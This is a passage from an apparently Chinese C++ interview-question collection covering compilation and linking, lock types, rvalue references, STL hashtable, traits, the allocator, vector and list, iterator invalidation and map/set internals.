src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/微信截图_20210201114531.png" alt=""></p><ul><li>预处理阶段：处理以 # 开头的预处理命令；</li><li>编译阶段：翻译成汇编文件；</li><li>汇编阶段：将汇编文件翻译成可重定位目标文件；</li><li>链接阶段：将可重定位目标文件和 printf.o 等单独预编译好的目标文件进行合并，得到最终的可执行目标文件。</li></ul><h5 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h5><p>静态链接器以一组可重定位目标文件为输入，生成一个完全链接的可执行目标文件作为输出。链接器主要完成以下两个任务：</p><ul><li>符号解析：每个符号对应于一个函数、一个全局变量或一个静态变量，符号解析的目的是将每个符号引用与一个符号定义关联起来。</li><li>重定位：链接器通过把每个符号定义与一个内存位置关联起来，然后修改所有对这些符号的引用，使得它们指向这个内存位置。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/微信截图_20210201114618.png" alt=""></p><h5 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h5><ul><li>可执行目标文件：可以直接在内存中执行；</li><li>可重定位目标文件：可与其它可重定位目标文件在链接阶段合并，创建一个可执行目标文件；</li><li>共享目标文件：这是一种特殊的可重定位目标文件，可以在运行时被动态加载进内存并链接；</li></ul><h5 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h5><p>静态库有以下两个问题：</p><ul><li>当静态库更新时那么整个程序都要重新进行链接；</li><li>对于 printf 这种标准函数库，如果每个程序都要有代码，这会极大浪费资源。</li></ul><p>共享库是为了解决静态库的这两个问题而设计的，在 Linux 系统中通常用 .so 后缀来表示，Windows 系统上它们被称为 DLL。它具有以下特点：</p><ul><li>在给定的文件系统中一个库只有一个文件，所有引用该库的可执行目标文件都共享这个文件，它不会被复制到引用它的可执行文件中；</li><li>在内存中，一个共享库的 .text 节（已编译程序的机器代码）的一个副本可以被不同的正在运行的进程共享。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/微信截图_20210201115700.png" alt=""></p><p><strong>源代码－－&gt;预处理－－&gt;编译－－&gt;优化－－&gt;汇编－－&gt;链接—&gt;可执行文件</strong></p><p>1)   预处理</p><p>读取c源程序，对其中的伪指令（以#开头的指令）和特殊符号进行处理。包括宏定义替换、条件编译指令、头文件包含指令、特殊符号。 预编译程序所完成的基本上是对源程序的“替代”工作。经过此种替代，生成一个没有宏定义、没有条件编译指令、没有特殊符号的输出文件。.i预处理后的c文件，.ii预处理后的c文件。</p><p>2)   编译阶段</p><p>编译程序所要作得工作就是通过词法分析和语法分析，在确认所有的指令都符合语法规则之后，将其翻译成等价的中间代码表示或汇编代码。.s文件</p><p>3)   汇编过程</p><p>汇编过程实际上指把汇编语言代码翻译成目标机器指令的过程。对于被翻译系统处理的每一个C语言源程序，都将最终经过这一处理而得到相应的目标文件。目标文件中所存放的也就是与源程序等效的目标的机器语言代码。.o目标文件</p><p>4)   链接阶段</p><p>链接程序的主要工作就是将有关的目标文件彼此相连接，也即将在一个文件中引用的符号同该符号在另外一个文件中的定义连接起来，使得所有的这些目标文件成为一个能够诶操作系统装入执行的统一整体。</p><h4 id="185、介绍一下几种典型的锁"><a href="#185、介绍一下几种典型的锁" class="headerlink" title="185、介绍一下几种典型的锁"></a>185、介绍一下几种典型的锁</h4><p><strong>读写锁</strong></p><ul><li>多个读者可以同时进行读</li><li>写者必须互斥（只允许一个写者写，也不能读者写者同时进行）</li><li>写者优先于读者（一旦有写者，则后续读者必须等待，唤醒时优先考虑写者）</li></ul><p><strong>互斥锁</strong></p><p>一次只能一个线程拥有互斥锁，其他线程只有等待</p><p>互斥锁是在抢锁失败的情况下主动放弃CPU进入睡眠状态直到锁的状态改变时再唤醒，而操作系统负责线程调度，为了实现锁的状态发生改变时唤醒阻塞的线程或者进程，需要把锁交给操作系统管理，所以互斥锁在加锁操作时涉及上下文的切换。互斥锁实际的效率还是可以让人接受的，加锁的时间大概100ns左右，而实际上互斥锁的一种可能的实现是先自旋一段时间，当自旋的时间超过阀值之后再将线程投入睡眠中，因此在并发运算中使用互斥锁（每次占用锁的时间很短）的效果可能不亚于使用自旋锁</p><p><strong>条件变量</strong></p><p>互斥锁一个明显的缺点是他只有两种状态：锁定和非锁定。而条件变量通过允许线程阻塞和等待另一个线程发送信号的方法弥补了互斥锁的不足，他常和互斥锁一起使用，以免出现竞态条件。当条件不满足时，线程往往解开相应的互斥锁并阻塞线程然后等待条件发生变化。一旦其他的某个线程改变了条件变量，他将通知相应的条件变量唤醒一个或多个正被此条件变量阻塞的线程。总的来说互斥锁是线程间互斥的机制，条件变量则是同步机制。</p><p><strong>自旋锁</strong></p><p>如果进线程无法取得锁，进线程不会立刻放弃CPU时间片，而是一直循环尝试获取锁，直到获取为止。如果别的线程长时期占有锁那么自旋就是在浪费CPU做无用功，但是自旋锁一般应用于加锁时间很短的场景，这个时候效率比较高。</p><blockquote><p>《互斥锁、读写锁、自旋锁、条件变量的特点总结》：<a href="https://blog.csdn.net/RUN32875094/article/details/80169978">https://blog.csdn.net/RUN32875094/article/details/80169978</a></p></blockquote><h4 id="186、说一下c左值引用和右值引用"><a href="#186、说一下c左值引用和右值引用" class="headerlink" title="186、说一下c左值引用和右值引用"></a>186、说一下c左值引用和右值引用</h4><p>c11正是通过引入右值引用来优化性能，具体来说是通过移动语义来避免无谓拷贝的问题，通过move语义来将临时生成的左值中的资源无代价的转移到另外一个对象中去，通过完美转发来解决不能按照参数实际类型来转发的问题（同时，完美转发获得的一个好处是可以实现移动语义）。 </p><p>1)  在c11中所有的值必属于左值、右值两者之一，右值又可以细分为纯右值、将亡值。在c11中可以取地址的、有名字的就是左值，反之，不能取地址的、没有名字的就是右值（将亡值或纯右值）。举个例子，int a = b+c, a 就是左值，其有变量名为a，通过&amp;a可以获取该变量的地址；表达式b+c、函数int func()的返回值是右值，在其被赋值给某一变量前，我们不能通过变量名找到它，＆(b+c)这样的操作则不会通过编译。</p><p>2)  c11对c98中的右值进行了扩充。在c11中右值又分为纯右值（prvalue，Pure Rvalue）和将亡值（xvalue，eXpiring Value）。其中纯右值的概念等同于我们在c98标准中右值的概念，指的是临时变量和不跟对象关联的字面量值；将亡值则是c11新增的跟右值引用相关的表达式，这样表达式通常是将要被移动的对象（移为他用），比如返回右值引用T&amp;&amp;的函数返回值、std::move的返回值，或者转换为T&amp;&amp;的类型转换函数的返回值。将亡值可以理解为通过“盗取”其他变量内存空间的方式获取到的值。在确保其他变量不再被使用、或即将被销毁时，通过“盗取”的方式可以避免内存空间的释放和分配，能够延长变量值的生命期。</p><p>3)  左值引用就是对一个左值进行引用的类型。右值引用就是对一个右值进行引用的类型，事实上，由于右值通常不具有名字，我们也只能通过引用的方式找到它的存在。右值引用和左值引用都是属于引用类型。无论是声明一个左值引用还是右值引用，都必须立即进行初始化。而其原因可以理解为是引用类型本身自己并不拥有所绑定对象的内存，只是该对象的一个别名。左值引用是具名变量值的别名，而右值引用则是不具名（匿名）变量的别名。左值引用通常也不能绑定到右值，但常量左值引用是个“万能”的引用类型。它可以接受非常量左值、常量左值、右值对其进行初始化。不过常量左值所引用的右值在它的“余生”中只能是只读的。相对地，非常量左值只能接受非常量左值对其进行初始化。</p><p>4)  右值值引用通常不能绑定到任何的左值，要想绑定一个左值到右值引用，通常需要std::move()将左值强制转换为右值。</p><p><strong>左值和右值</strong></p><p>左值：表示的是可以获取地址的表达式，它能出现在赋值语句的左边，对该表达式进行赋值。但是修饰符const的出现使得可以声明如下的标识符，它可以取得地址，但是没办法对其进行赋值</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span></code></pre><p>右值：表示无法获取地址的对象，有常量值、函数返回值、lambda表达式等。无法获取地址，但不表示其不可改变，当定义了右值的右值引用时就可以更改右值。</p><p><strong>左值引用和右值引用</strong></p><p>左值引用：传统的c中引用被称为左值引用</p><p>右值引用：c11中增加了右值引用，右值引用关联到右值时，右值被存储到特定位置，右值引用指向该特定位置，也就是说，右值虽然无法获取地址，但是右值引用是可以获取地址的，该地址表示临时对象的存储位置</p><p><strong>这里主要说一下右值引用的特点：</strong></p><ul><li>特点1：通过右值引用的声明，右值又“重获新生”，其生命周期与右值引用类型变量的生命周期一样长，只要该变量还活着，该右值临时量将会一直存活下去</li><li>特点2：右值引用独立于左值和右值。意思是右值引用类型的变量可能是左值也可能是右值</li><li>特点3：T&amp;&amp; t在发生自动类型推断的时候，它是左值还是右值取决于它的初始化。</li></ul><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc.h></span></span>using namespace std<span class="token punctuation">;</span>template<span class="token operator">&lt;</span>typename T<span class="token operator">></span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span>T<span class="token operator">&amp;&amp;</span> t<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> t <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">getInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>  <span class="token comment">//b是左值引用</span><span class="token keyword">int</span><span class="token operator">&amp;</span> c <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>  <span class="token comment">//错误，c是左值不能使用右值初始化</span><span class="token keyword">int</span><span class="token operator">&amp;&amp;</span> d <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>  <span class="token comment">//正确，右值引用用右值初始化</span><span class="token keyword">int</span><span class="token operator">&amp;&amp;</span> e <span class="token operator">=</span> a<span class="token punctuation">;</span>  <span class="token comment">//错误，e是右值引用不能使用左值初始化</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> f <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment">//正确，左值常引用相当于是万能型，可以用左值或者右值初始化</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> g <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token comment">//正确，左值常引用相当于是万能型，可以用左值或者右值初始化</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;&amp;</span> h <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">//正确，右值常引用</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> aa <span class="token operator">=</span> h<span class="token punctuation">;</span><span class="token comment">//正确</span><span class="token keyword">int</span><span class="token operator">&amp;</span> i <span class="token operator">=</span> <span class="token function">getInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//错误，i是左值引用不能使用临时变量（右值）初始化</span><span class="token keyword">int</span><span class="token operator">&amp;&amp;</span> j <span class="token operator">=</span> <span class="token function">getInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//正确，函数返回值是右值</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//此时fun函数的参数t是右值</span><span class="token function">fun</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//此时fun函数的参数t是左值</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>《c右值引用以及使用》：<a href="https://www.cnblogs.com/likaiming/p/9045642.html">https://www.cnblogs.com/likaiming/p/9045642.html</a></p><p>《从4行代码看右值引用》：<a href="https://www.cnblogs.com/likaiming/p/9029908.html">https://www.cnblogs.com/likaiming/p/9029908.html</a></p></blockquote><h4 id="187、STL中hashtable的实现？"><a href="#187、STL中hashtable的实现？" class="headerlink" title="187、STL中hashtable的实现？"></a>187、STL中hashtable的实现？</h4><p>STL中的hashtable使用的是<strong>开链法</strong>解决hash冲突问题，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1566639786045.png" alt=""></p><p>hashtable中的bucket所维护的list既不是list也不是slist，而是其自己定义的由hashtable_node数据结构组成的linked-list，而bucket聚合体本身使用vector进行存储。hashtable的迭代器只提供前进操作，不提供后退操作</p><p>在hashtable设计bucket的数量上，其内置了28个质数[53, 97, 193,…,429496729]，在创建hashtable时，会根据存入的元素个数选择大于等于元素个数的质数作为hashtable的容量（vector的长度），其中每个bucket所维护的linked-list长度也等于hashtable的容量。如果插入hashtable的元素个数超过了bucket的容量，就要进行重建table操作，即找出下一个质数，创建新的buckets vector，重新计算元素在新hashtable的位置。</p><blockquote><p>《STL源码解析》侯捷</p></blockquote><h4 id="188、简单说一下STL中的traits技法"><a href="#188、简单说一下STL中的traits技法" class="headerlink" title="188、简单说一下STL中的traits技法"></a>188、简单说一下STL中的traits技法</h4><p>traits技法利用“内嵌型别“的编程技巧与<strong>编译器的template参数推导功能</strong>，增强c未能提供的关于型别认证方面的能力。常用的有iterator_traits和type_traits。</p><p><strong>iterator_traits</strong></p><p>被称为<strong>特性萃取机</strong>，能够方面的让外界获取以下5中型别：</p><ul><li>value_type：迭代器所指对象的型别</li><li>difference_type：两个迭代器之间的距离</li><li>pointer：迭代器所指向的型别</li><li>reference：迭代器所引用的型别</li><li>iterator_category：三两句说不清楚，建议看书</li></ul><p><strong>type_traits</strong></p><p>关注的是型别的<strong>特性</strong>，例如这个型别是否具备non-trivial defalt ctor（默认构造函数）、non-trivial copy ctor（拷贝构造函数）、non-trivial assignment operator（赋值运算符） 和non-trivial dtor（析构函数），如果答案是否定的，可以采取直接操作内存的方式提高效率，一般来说，type_traits支持以下5中类型的判断：</p><pre class="language-c" data-language="c"><code class="language-c">__type_traits<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token operator">::</span>has_trivial_default_constructor__type_traits<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token operator">::</span>has_trivial_copy_constructor__type_traits<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token operator">::</span>has_trivial_assignment_operator__type_traits<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token operator">::</span>has_trivial_destructor__type_traits<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token operator">::</span>is_POD_type</code></pre><p>由于编译器只针对class object形式的参数进行参数推到，因此上式的返回结果不应该是个bool值，实际上使用的是一种空的结构体：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">__true_type</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">__false_type</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>这两个结构体没有任何成员，不会带来其他的负担，又能满足需求，可谓一举两得</p><p>当然，如果我们自行定义了一个Shape类型，也可以针对这个Shape设计type_traits的特化版本</p><pre class="language-c" data-language="c"><code class="language-c">template<span class="token operator">&lt;</span><span class="token operator">></span> <span class="token keyword">struct</span> <span class="token class-name">__type_traits</span><span class="token operator">&lt;</span>Shape<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token keyword">typedef</span> __true_type has_trivial_default_constructor<span class="token punctuation">;</span><span class="token keyword">typedef</span> __false_type has_trivial_copy_constructor<span class="token punctuation">;</span><span class="token keyword">typedef</span> __false_type has_trivial_assignment_operator<span class="token punctuation">;</span><span class="token keyword">typedef</span> __false_type has_trivial_destructor<span class="token punctuation">;</span><span class="token keyword">typedef</span> __false_type is_POD_type<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><blockquote><p>《STL源码解析》侯捷 P103-P110</p></blockquote><h4 id="189、STL的两级空间配置器"><a href="#189、STL的两级空间配置器" class="headerlink" title="189、STL的两级空间配置器"></a>189、STL的两级空间配置器</h4><p>1、首先明白为什么需要二级空间配置器？</p><p>我们知道动态开辟内存时，要在堆上申请，但若是我们需要</p><p>频繁的在堆开辟释放内存，则就会<strong>在堆上造成很多外部碎片</strong>，浪费了内存空间；</p><p>每次都要进行调用<strong>malloc、free</strong>函数等操作，使空间就会增加一些附加信息，降低了空间利用率；</p><p>随着外部碎片增多，内存分配器在找不到合适内存情况下需要合并空闲块，浪费了时间，大大降低了效率。</p><p>于是就设置了二级空间配置器，<strong>当开辟内存&lt;=128bytes时，即视为开辟小块内存，则调用二级空间配置器。</strong></p><p>关于STL中一级空间配置器和二级空间配置器的选择上，一般默认<strong>选择的为二级空间配置器</strong>。 如果大于128字节再转去一级配置器器。</p><h5 id="一级配置器"><a href="#一级配置器" class="headerlink" title="一级配置器"></a>一级配置器</h5><p> <strong>一级空间配置器</strong>中重要的函数就是allocate、deallocate、reallocate 。 一级空间配置器是以malloc()，free()，realloc()等C函数执行实际的内存配置 。大致过程是：</p><p>1、直接allocate分配内存，其实就是malloc来分配内存，成功则直接返回，失败就调用处理函数</p><p>2、如果用户自定义了内存分配失败的处理函数就调用，没有的话就返回异常</p><p>3、如果自定义了处理函数就进行处理，完事再继续分配试试</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/微信截图_20210201115745.png" alt=""></p><h5 id="二级配置器"><a href="#二级配置器" class="headerlink" title="二级配置器"></a>二级配置器</h5><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102//微信截图_20210201115831.png" alt=""></p><p>1、维护16条链表，分别是0-15号链表，最小8字节，以8字节逐渐递增，最大128字节，你传入一个字节参数，表示你需要多大的内存，会自动帮你校对到第几号链表（如需要13bytes空间，我们会给它分配16bytes大小），在找到第你个链表后查看链表是否为空，如果不为空直接从对应的free_list中拔出，将已经拨出的指针向后移动一位。</p><p>2、对应的free_list为空，先看其内存池是不是空时，如果内存池不为空：<br>（1）先检验它剩余空间是否够20个节点大小（即所需内存大小(提升后) <em> 20），若足够则直接从内存池中拿出20个节点大小空间，将其中一个分配给用户使用，另外19个当作自由链表中的区块挂在相应的free_list下，这样下次再有相同大小的内存需求时，可直接拨出。<br>（2）如果不够20个节点大小，则看它是否能满足1个节点大小，如果够的话则直接拿出一个分配给用户，然后从剩余的空间中分配尽可能多的节点挂在相应的free_list中。<br>（3）如果连一个节点内存都不能满足的话，则将内存池中剩余的空间挂在相应的free_list中（找到相应的free_list），然后再给内存池申请内存，转到3。<br>3、内存池为空，申请内存<br>此时二级空间配置器会使用malloc()从heap上申请内存，（一次所申请的内存大小为2 </em> 所需节点内存大小（提升后）* 20 + 一段额外空间），申请40块，一半拿来用，一半放内存池中。<br>4、malloc没有成功<br>在第三种情况下，如果malloc()失败了，说明heap上没有足够空间分配给我们了，这时，二级空间配置器会从比所需节点空间大的free_list中一一搜索，从比它所需节点空间大的free_list中拔除一个节点来使用。如果这也没找到，说明比其大的free_list中都没有自由区块了，那就要调用一级适配器了。</p><p>释放时调用deallocate()函数，若释放的n&gt;128，则调用一级空间配置器，否则就直接将内存块挂上自由链表的合适位置。</p><p>STL二级空间配置器虽然解决了外部碎片与提高了效率，但它同时增加了一些缺点：</p><p>1.因为自由链表的管理问题，它会把我们需求的内存块自动提升为8的倍数，这时若你需要1个字节，它会给你8个字节，即浪费了7个字节，所以它又引入了内部碎片的问题，若相似情况出现很多次，就会造成很多内部碎片；</p><p>2.二级空间配置器是在堆上申请大块的狭义内存池，然后用自由链表管理，供现在使用，在程序执行过程中，它将申请的内存一块一块都挂在自由链表上，即不会还给操作系统，并且它的实现中所有成员全是静态的，所以它申请的所有内存只有在进程结束才会释放内存，还给操作系统，由此带来的问题有：1.即我不断的开辟小块内存，最后整个堆上的空间都被挂在自由链表上，若我想开辟大块内存就会失败；2.若自由链表上挂很多内存块没有被使用，当前进程又占着内存不释放，这时别的进程在堆上申请不到空间，也不可以使用当前进程的空闲内存，由此就会引发多种问题。</p><h5 id="一级分配器"><a href="#一级分配器" class="headerlink" title="一级分配器"></a>一级分配器</h5><p>GC4.9之后就没有第一级了，只有第二级</p><h5 id="二级分配器："><a href="#二级分配器：" class="headerlink" title="二级分配器："></a>二级分配器：</h5><p>——default_alloc_template 剖析</p><p>有个自动调整的函数：你传入一个字节参数，表示你需要多大的内存，会自动帮你校对到第几号链表（0-15号链表，最小8字节 最大128字节）</p><p>allocate函数：如果要分配的内存大于128字节，就转用第一级分配器，否则也就是小于128字节。那么首先判断落在第几号链表，定位到了，先判断链表是不是空，如果是空就需要充值，（调节到8的倍数，默认一次申请20个区块，当然了也要判断20个是不是能够申请到，如果只申请到一个那就直接返回好了，不止一个的话，把第2到第n个挨个挂到当前链表上，第一个返回回去给容器用,n是不大于20的，当然了如果不在1-20之间，那就是内存碎片了，那就先把碎片挂到某一条链表上，然后再重新malloc了，malloc  2*20个块）去内存池去拿或者重新分配。不为空的话</p><h4 id="190、-vector与list的区别与应用？怎么找某vector或者list的倒数第二个元素"><a href="#190、-vector与list的区别与应用？怎么找某vector或者list的倒数第二个元素" class="headerlink" title="190、 vector与list的区别与应用？怎么找某vector或者list的倒数第二个元素"></a>190、 vector与list的区别与应用？怎么找某vector或者list的倒数第二个元素</h4><p>1)  vector数据结构<br> vector和数组类似，拥有一段连续的内存空间，并且起始地址不变。因此能高效的进行随机存取，时间复杂度为o(1);但因为内存空间是连续的，所以在进行插入和删除操作时，会造成内存块的拷贝，时间复杂度为o(n)。另外，当数组中内存空间不够时，会重新申请一块内存空间并进行内存拷贝。连续存储结构：vector是可以实现动态增长的对象数组，支持对数组高效率的访问和在数组尾端的删除和插入操作，在中间和头部删除和插入相对不易，需要挪动大量的数据。它与数组最大的区别就是vector不需程序员自己去考虑容量问题，库里面本身已经实现了容量的动态增长，而数组需要程序员手动写入扩容函数进形扩容。</p><p>2)  list数据结构<br> list是由双向链表实现的，因此内存空间是不连续的。只能通过指针访问数据，所以list的随机存取非常没有效率，时间复杂度为o(n);但由于链表的特点，能高效地进行插入和删除。非连续存储结构：list是一个双链表结构，支持对链表的双向遍历。每个节点包括三个信息：元素本身，指向前一个元素的节点（prev）和指向下一个元素的节点（next）。因此list可以高效率的对数据元素任意位置进行访问和插入删除等操作。由于涉及对额外指针的维护，所以开销比较大。</p><p>区别：</p><p>vector的随机访问效率高，但在插入和删除时（不包括尾部）需要挪动数据，不易操作。list的访问要遍历整个链表，它的随机访问效率低。但对数据的插入和删除操作等都比较方便，改变指针的指向即可。list是单向的，vector是双向的。vector中的迭代器在使用后就失效了，而list的迭代器在使用之后还可以继续使用。 </p><p>3)   </p><p>int mySize = vec.size();vec.at(mySize -2);</p><p>list不提供随机访问，所以不能用下标直接访问到某个位置的元素，要访问list里的元素只能遍历，不过你要是只需要访问list的最后N个元素的话，可以用反向迭代器来遍历：</p><h4 id="191、STL-中vector删除其中的元素，迭代器如何变化？为什么是两倍扩容？释放空间？"><a href="#191、STL-中vector删除其中的元素，迭代器如何变化？为什么是两倍扩容？释放空间？" class="headerlink" title="191、STL 中vector删除其中的元素，迭代器如何变化？为什么是两倍扩容？释放空间？"></a>191、STL 中vector删除其中的元素，迭代器如何变化？为什么是两倍扩容？释放空间？</h4><p>size()函数返回的是已用空间大小，capacity()返回的是总空间大小，capacity()-size()则是剩余的可用空间大小。当size()和capacity()相等，说明vector目前的空间已被用完，如果再添加新元素，则会引起vector空间的动态增长。</p><p>由于动态增长会引起重新分配内存空间、拷贝原空间、释放原空间，这些过程会降低程序效率。因此，可以使用reserve(n)预先分配一块较大的指定大小的内存空间，这样当指定大小的内存空间未使用完时，是不会重新分配内存空间的，这样便提升了效率。只有当n&gt;capacity()时，调用reserve(n)才会改变vector容量。</p><p> resize()成员函数只改变元素的数目，不改变vector的容量。</p><p>1、空的vector对象，size()和capacity()都为0</p><p>2、当空间大小不足时，新分配的空间大小为原空间大小的2倍。</p><p>3、使用reserve()预先分配一块内存后，在空间未满的情况下，不会引起重新分配，从而提升了效率。</p><p>4、当reserve()分配的空间比原空间小时，是不会引起重新分配的。</p><p>5、resize()函数只改变容器的元素数目，未改变容器大小。</p><p>6、用reserve(size_type)只是扩大capacity值，这些内存空间可能还是“野”的，如果此时使用“[ ]”来访问，则可能会越界。而resize(size_type new_size)会真正使容器具有new_size个对象。</p><p> 不同的编译器，vector有不同的扩容大小。在vs下是1.5倍，在GCC下是2倍；</p><p>空间和时间的权衡。简单来说， 空间分配的多，平摊时间复杂度低，但浪费空间也多。</p><p>使用k=2增长因子的问题在于，每次扩展的新尺寸必然刚好大于之前分配的总和，也就是说，之前分配的内存空间不可能被使用。这样对内存不友好。最好把增长因子设为(1,2)</p><p> 对比可以发现采用采用成倍方式扩容，可以保证常数的时间复杂度，而增加指定大小的容量只能达到O(n)的时间复杂度，因此，使用成倍的方式扩容。</p><p>如何释放空间：</p><p>由于vector的内存占用空间只增不减，比如你首先分配了10,000个字节，然后erase掉后面9,999个，留下一个有效元素，但是内存占用仍为10,000个。所有内存空间是在vector析构时候才能被系统回收。empty()用来检测容器是否为空的，clear()可以清空所有元素。但是即使clear()，vector所占用的内存空间依然如故，无法保证内存的回收。</p><p>如果需要空间动态缩小，可以考虑使用deque。如果vector，可以用swap()来帮助你释放内存。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">vector</span><span class="token punctuation">(</span>Vec<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>Vec<span class="token punctuation">)</span><span class="token punctuation">;</span> 将Vec的内存空洞清除； <span class="token function">vector</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>Vec<span class="token punctuation">)</span><span class="token punctuation">;</span> 清空Vec的内存；</code></pre><h4 id="192、容器内部删除一个元素"><a href="#192、容器内部删除一个元素" class="headerlink" title="192、容器内部删除一个元素"></a>192、容器内部删除一个元素</h4><p>1)  顺序容器</p><p>erase迭代器不仅使所指向被删除的迭代器失效，而且使被删元素之后的所有迭代器失效(list除外)，所以不能使用erase(it++)的方式，但是erase的返回值是下一个有效迭代器；</p><p>It = c.erase(it);</p><p>2)  关联容器</p><p>erase迭代器只是被删除元素的迭代器失效，但是返回值是void，所以要采用erase(it++)的方式删除迭代器；</p><p>c.erase(it++)</p><h4 id="193、STL迭代器如何实现"><a href="#193、STL迭代器如何实现" class="headerlink" title="193、STL迭代器如何实现"></a>193、STL迭代器如何实现</h4><p>1、 迭代器是一种抽象的设计理念，通过迭代器可以在不了解容器内部原理的情况下遍历容器，除此之外，STL中迭代器一个最重要的作用就是作为容器与STL算法的粘合剂。</p><p>2、 迭代器的作用就是提供一个遍历容器内部所有元素的接口，因此迭代器内部必须保存一个与容器相关联的指针，然后重载各种运算操作来遍历，其中最重要的是*运算符与-&gt;运算符，以及++、—等可能需要重载的运算符重载。这和c中的智能指针很像，智能指针也是将一个指针封装，然后通过引用计数或是其他方法完成自动释放内存的功能。</p><p>3、最常用的迭代器的相应型别有五种：value type、difference type、pointer、reference、iterator catagoly;</p><h4 id="194、map、set是怎么实现的，红黑树是怎么能够同时实现这两种容器？-为什么使用红黑树？"><a href="#194、map、set是怎么实现的，红黑树是怎么能够同时实现这两种容器？-为什么使用红黑树？" class="headerlink" title="194、map、set是怎么实现的，红黑树是怎么能够同时实现这两种容器？ 为什么使用红黑树？"></a>194、map、set是怎么实现的，红黑树是怎么能够同时实现这两种容器？ 为什么使用红黑树？</h4><p>1)  他们的底层都是以红黑树的结构实现，因此插入删除等操作都在O(logn时间内完成，因此可以完成高效的插入删除；</p><p>2)  在这里我们定义了一个模版参数，如果它是key那么它就是set，如果它是map，那么它就是map；底层是红黑树，实现map的红黑树的节点数据类型是key+value，而实现set的节点数据类型是value</p><p>3)  因为map和set要求是自动排序的，红黑树能够实现这一功能，而且时间复杂度比较低。</p><h4 id="195、如何在共享内存上使用stl标准库？"><a href="#195、如何在共享内存上使用stl标准库？" class="headerlink" title="195、如何在共享内存上使用stl标准库？"></a>195、如何在共享内存上使用stl标准库？</h4><p>1)  想像一下把STL容器，例如map, vector, list等等，放入共享内存中，IPC一旦有了这些强大的通用数据结构做辅助，无疑进程间通信的能力一下子强大了很多。</p><p>我们没必要再为共享内存设计其他额外的数据结构，另外，STL的高度可扩展性将为IPC所驱使。STL容器被良好的封装，默认情况下有它们自己的内存管理方案。</p><p>当一个元素被插入到一个STL列表(list)中时，列表容器自动为其分配内存，保存数据。考虑到要将STL容器放到共享内存中，而容器却自己在堆上分配内存。</p><p>一个最笨拙的办法是在堆上构造STL容器，然后把容器复制到共享内存，并且确保所有容器的内部分配的内存指向共享内存中的相应区域，这基本是个不可能完成的任务。</p><p>2)  假设进程A在共享内存中放入了数个容器，进程B如何找到这些容器呢？</p><p>一个方法就是进程A把容器放在共享内存中的确定地址上（fixed 